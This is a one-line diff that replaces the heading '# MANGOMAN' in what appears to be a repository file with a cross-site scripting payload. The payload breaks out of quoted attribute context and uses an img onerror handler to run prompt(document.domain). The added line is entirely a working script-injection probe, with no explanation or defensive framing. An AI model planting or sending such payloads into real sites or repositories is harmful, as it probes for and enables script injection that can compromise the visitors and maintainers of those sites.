@@ -1,1 +1,1 @@
-# MANGOMAN
+"'><img src=x onerror=prompt(document.domain)>
